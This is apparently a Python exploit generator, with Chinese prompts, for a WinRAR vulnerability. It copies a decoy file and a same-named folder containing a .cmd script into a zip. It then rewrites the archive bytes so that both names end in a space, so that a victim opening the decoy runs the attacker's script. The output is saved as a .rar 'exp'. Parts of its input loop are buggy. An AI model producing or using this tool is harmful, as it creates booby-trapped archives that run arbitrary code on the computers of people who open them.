import shutil
from pathlib import Path
import os

base_file_path = r"evil-winrar\payload\script.bat"
script_file_path = r"evil-winrar\payload\test.txt"
# tempfile.mkdtemp(dir="winrar-cve\test\output")
output_file_path = r"winrar-cve\test\output"

save_file_path = r"save.zip"

base_file_suffix = bytes(Path(base_file_path).suffix,"utf-8")

def output_dir_check(output_file_name)->Path:
    if Path(output_file_name).exists():
         shutil.rmtree(output_file_name)
    else:
         Path.mkdir(output_file_name)
         a = Path(output_file_name).resolve()
         return a

def generate_exp(base_file_path:str,script_file_path:str,save_file_path:str):
        if not save_file_path.endswith(".rar"):
            save_file_path = save_file_path + ".rar"

        base_file_name = Path(base_file_path).name
        
        output_file_name = Path(output_file_path).name

        output_dir = output_dir_check(str(output_file_name))  
        print(str(output_dir))
        
        
        dir_base_file_name = str(base_file_name) + "A"
        dir_script_dir = Path.joinpath(output_dir,str(base_file_name)+"B")
        Path.mkdir(dir_script_dir,parents=True)

        shutil.copyfile(Path(base_file_path).resolve(),Path(output_dir).joinpath(dir_base_file_name))
        shutil.copyfile(Path(script_file_path).resolve(),Path(dir_script_dir).joinpath(base_file_name+"A.cmd"))

        shutil.make_archive(str(output_dir),"zip",str(output_dir))

        with open(str(output_dir)+".zip","rb") as zip_file:
             content = zip_file.read()
             content = content.replace(base_file_suffix+b"A",base_file_suffix+b" ")
             content = content.replace(base_file_suffix+b"B",base_file_suffix+b" ")

        os.remove(str(output_dir)+".zip")

        with open(save_file_path,"wb+") as f:
             f.write(content)

        shutil.rmtree(output_dir)
        print(f"exp保存在{os.path.abspath(save_file_path)}")
        return save_file_path

def do_generate():
    while True:
        print("请输入你的模板文件路径")
        base_file_path = input("generate> 模板文件路径:")
        if os.path.exists(base_file_path):
             if os.path.isfile():
                  break
             else:
                  print("该路径不是文件,请重新输入")
        else:
             print("该路径文件不存在,请重新输入")
        print("请输入你想执行脚本的路径")
        script_file_path = input("generate> 脚本文件的路径路径:")
        if os.path.exists(script_file_path):
             if os.path.isfile():
                  break
             else:
                  print("该路径不是文件,请重新输入")
        else:
             print("该路径文件不存在,请重新输入")
        print("请输入你想保存exp的路径:")
        save_file_path = input("generate> 保存exp的路径:")
        if os.path.exists(save_file_path):
             if os.path.isfile():
                  break
             else:
                  print("该路径不是文件,请重新输入")
        else:
             print("该路径文件不存在,请重新输入")

if __name__ == "__main__":
    generate_exp(base_file_path,script_file_path,save_file_path) 

    



